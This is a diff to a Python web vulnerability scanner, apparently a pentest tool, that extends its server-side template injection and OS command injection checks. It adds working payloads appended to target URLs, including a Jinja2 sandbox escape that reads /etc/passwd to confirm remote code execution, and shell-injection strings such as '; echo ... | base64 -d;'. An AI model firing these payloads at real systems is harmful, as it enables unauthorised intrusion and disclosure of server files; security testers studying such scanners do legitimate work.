@@ -1,4 +1,3 @@
-#!/usr/bin/python3
 from Wappalyzer import Wappalyzer, WebPage
 import requests
 import vulners
@@ -83,13 +82,40 @@ class Scanner:
             return "Check Through The Output"
 
     def test_ssti(url):
-        payload = "{{7*7}}"
-        fattempt = f"{url}{payload}"
-        req = requests.get(fattempt,verify=False)
+        payload1 = "{{7*'7'}}"
+        payload2 = "${1000+337}"
+        payload3 = "#{1000+337}"
+        payload4 = "${{7*'7'}}"
+        rce_payload = "{{ ''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read() }}"
+
+        fattempt = f"{url}{payload1}"
+        sattempt = f"{url}{payload2}"
+        tattempt = f"{url}{payload3}"
+        frattempt = f"{url}{payload4}"
+        
+        req1 = requests.get(fattempt,verify=False)
+        req2 = requests.get(sattempt,verify=False)
+        req3 = requests.get(tattempt,verify=False)
+        req4 = requests.get(frattempt,verify=False)
+
+        positive = "SSTI(Server Side Template Injection)"
+
         #print(req.text)
-        if req.status_code == 200:
-            if "49" in req.text:
-                return "SSTI(Server Side Template Injection)"
+        
+        if req1.status_code == 200 and req2.status_code == 200 and req3.status_code == 200 and req4.status_code == 200:
+            if "7777777" in req1.text or '49' in req1.text:
+                attempt = f"{url}{rce_payload}"
+                req = requests.get(attempt,verify=False)
+                if "root:x" in req.text:
+                    return "SSTI + RCE"
+                else:
+                    return positive
+            elif "1337" in req2.text:
+                return positive
+            elif "1337" in req3.text:
+                return positive
+            elif "7777777" in req4.text or '49' in req4.text:
+                return positive
             else:
                 return ""
         else:
@@ -153,14 +179,19 @@ class Scanner:
     def test_cmdi(url):
         payload1 = "; echo 'aGVsbG8K'|base64 -d;"
         payload2 = "\necho 'aGVsbG8K'|base64 -d;"
+        payload3 = "@(1000+337)"
         fattempt = f"{url}{payload1}"
         sattempt = f"{url}{payload2}"
+        tattempt = f"{url}{payload3}"
 
         req1 = requests.get(fattempt,verify=False)
         req2 = requests.get(sattempt,verify=False)
+        req3 = requests.get(tattempt,verify=False)
 
-        if req1.status_code == 200 and req2.status_code == 200:
+        if req1.status_code == 200 and req2.status_code == 200 and req3.status_code == 200:
             if 'hello' in req1.text or 'hello' in req2.text:
+                return "OS Command Injection"
+            elif '1337' in req3.text:
                 return "OS Command Injection"
             else:
                 return ""
